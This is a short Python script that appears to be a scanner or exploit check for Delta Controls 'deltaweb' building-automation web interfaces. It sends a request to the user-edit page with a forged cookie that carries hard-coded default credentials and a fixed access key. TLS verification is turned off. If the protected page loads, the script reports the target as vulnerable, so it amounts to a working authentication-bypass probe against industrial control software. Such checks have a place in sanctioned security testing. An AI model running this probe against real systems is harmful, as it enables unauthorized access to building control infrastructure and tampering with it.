import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"deltaweb/hmi_useredit.asp?ObjRef=BAC.1000.ZSL3&formAction=Edit"
	headers={'cookie': 'Previous=; lastLoaded=; LastUser=DELTA; LogoutTime=10; UserInstance=1; UserName=DELTA; Password=LOGIN; LastGraphic=; LastObjRef=; AccessKey=DADGGEOFNILEJMBBCNDKFNJPHPPJDAEDGEBJACPEAPBHDCGPCAGNNDEOJIJEOPPLOEKCFMAFNHDJPHGACMDFMPFDNONPIJAHBBNAAIDMDHCCPMAJDELDNLOPBPDCKELJADDKICPMMPCNEOMBHMKIIBJHFAJKNKJFGDEOLPMGMNBEHFLNEDIFMJKMCJKBHPGGEMHJJGMOMAECDKDIIKGNDDGANIHDKPNACLMANGJAOBDNJCFGEIHIJICLPGOFFMDOOLOJCJPAPPKOJFCKFAHDDAGNLCAHKKKGHCBODHBNDCOECGHG'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "Auto-logoff Period" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
